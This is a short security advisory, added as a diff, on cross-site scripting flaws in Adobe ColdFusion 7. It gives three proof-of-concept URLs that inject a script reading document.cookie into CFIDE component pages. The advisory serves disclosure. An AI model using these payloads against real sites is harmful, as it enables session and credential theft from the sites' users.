@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/49787/info
+
+Adobe ColdFusion is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+An attacker could exploit these vulnerabilities to execute arbitrary script code in the context of the affected website. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Adobe ColdFusion 7 is vulnerable; other versions may also be affected. 
+
+http://example.com/CFIDE/componentutils/componentdetail.cfm?component=%3Cbody%20onload=alert(document.cookie)%3E
+
+http://example.com/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=%3Cbody%20onload=alert(document.cookie)%3E
+
+http://example.com/CFIDE/componentutils/cfcexplorer.cfc?method=%3Cbody%20onload=alert(document.cookie)%3E 
